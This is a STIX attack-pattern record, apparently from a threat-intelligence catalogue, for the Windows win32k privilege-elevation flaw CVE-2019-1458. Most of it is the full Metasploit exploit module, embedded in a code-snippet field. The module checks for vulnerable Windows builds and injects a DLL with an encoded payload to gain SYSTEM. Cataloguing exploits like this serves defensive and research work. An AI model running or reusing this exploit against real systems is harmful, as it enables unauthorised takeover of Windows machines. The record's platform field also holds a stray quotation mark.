{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bec86c75-1b16-4168-9fd2-baa4cf4e7020",
    "created": "2024-08-14T16:49:19.246201Z",
    "modified": "2024-08-14T16:49:19.246205Z",
    "name": "Microsoft Windows Uninitialized Variable Local Privilege Elevation",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2019_1458_wizardopium.rb",
            "external_id": "cve_2019_1458_wizardopium.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-1458"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/unamer/CVE-2019-1458"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/piotrflorczyk/cve-2019-1458_POC"
        },
        {
            "source_name": "reference",
            "url": "https://securelist.com/windows-0-day-exploit-cve-2019-1458-used-in-operation-wizardopium/95432/"
        },
        {
            "source_name": "reference",
            "url": "https://googleprojectzero.blogspot.com/p/rca-cve-2019-1458.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Windows Uninitialized Variable Local Privilege Elevation',\n        'Description' => %q{\n          This module exploits CVE-2019-1458, an arbitrary pointer dereference vulnerability\n          within win32k which occurs due to an uninitalized variable, which allows user mode attackers\n          to write a limited amount of controlled data to an attacker controlled address\n          in kernel memory. By utilizing this vulnerability to execute controlled writes\n          to kernel memory, an attacker can gain arbitrary code execution\n          as the SYSTEM user.\n\n          This module has been tested against Windows 7 x64 SP1. Offsets within the\n          exploit code may need to be adjusted to work with other versions of Windows.\n          The exploit can only be triggered once against the target and can cause the\n          target machine to reboot when the session is terminated.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'piotrflorczyk', # poc\n          'unamer', # exploit\n          'timwr', # msf module\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          ['Windows 7 x64', { 'Arch' => ARCH_X64 }]\n        ],\n        'Notes' => {\n          'Stability' => [ CRASH_OS_RESTARTS ],\n          'Reliability' => [ UNRELIABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        },\n        'References' => [\n          ['CVE', '2019-1458'],\n          ['URL', 'https://github.com/unamer/CVE-2019-1458'],\n          ['URL', 'https://github.com/piotrflorczyk/cve-2019-1458_POC'],\n          ['URL', 'https://securelist.com/windows-0-day-exploit-cve-2019-1458-used-in-operation-wizardopium/95432/'],\n          ['URL', 'https://googleprojectzero.blogspot.com/p/rca-cve-2019-1458.html']\n        ],\n        'DisclosureDate' => '2019-12-10',\n        'DefaultTarget' => 0,\n        'AKA' => [ 'WizardOpium' ]\n      )\n    )\n  end\n\n  def check\n    if session.platform != 'windows'\n      # Non-Windows systems are definitely not affected.\n      return CheckCode::Safe\n    end\n\n    file_path = expand_path('%WINDIR%\\\\system32\\\\win32k.sys')\n    major, minor, build, revision, branch = file_version(file_path)\n    vprint_status(\"win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}\")\n\n    build_num_gemversion = Rex::Version.new(\"#{major}.#{minor}.#{build}.#{revision}\")\n\n    # Build numbers taken from https://www.qualys.com/research/security-alerts/2019-12-10/microsoft/\n    if (build_num_gemversion >= Rex::Version.new('6.0.6000.0')) && (build_num_gemversion < Rex::Version.new('6.0.6003.20692')) # Windows Vista and Windows Server 2008\n      return CheckCode::Appears\n    elsif (build_num_gemversion >= Rex::Version.new('6.1.7600.0')) && (build_num_gemversion < Rex::Version.new('6.1.7601.24540')) # Windows 7 and Windows Server 2008 R2\n      return CheckCode::Appears\n    elsif (build_num_gemversion >= Rex::Version.new('6.2.9200.0')) && (build_num_gemversion < Rex::Version.new('6.2.9200.22932')) # Windows 8 and Windows Server 2012\n      return CheckCode::Appears\n    elsif (build_num_gemversion >= Rex::Version.new('6.3.9600.0')) && (build_num_gemversion < Rex::Version.new('6.3.9600.19574')) # Windows 8.1 and Windows Server 2012 R2\n      return CheckCode::Appears\n    elsif (build_num_gemversion >= Rex::Version.new('10.0.10240.0')) && (build_num_gemversion < Rex::Version.new('10.0.10240.18427')) # Windows 10 v1507\n      return CheckCode::Appears\n    elsif (build_num_gemversion >= Rex::Version.new('10.0.10586.0')) && (build_num_gemversion < Rex::Version.new('10.0.10586.99999')) # Windows 10 v1511\n      return CheckCode::Appears\n    elsif (build_num_gemversion >= Rex::Version.new('10.0.14393.0')) && (build_num_gemversion < Rex::Version.new('10.0.14393.3383')) # Windows 10 v1607\n      return CheckCode::Appears\n    else\n      return CheckCode::Safe\n    end\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo['Architecture'] != ARCH_X64\n      fail_with(Failure::NoTarget, 'Running against 32-bit systems is not supported')\n    end\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    print_status('Triggering the exploit...')\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(::Msf::Config.data_directory, 'exploits', 'CVE-2019-1458', 'exploit.dll'),\n      [encoded_payload.length].pack('I<') + encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-12-10",
    "x_mitre_platforms": [
        "win'"
    ]
}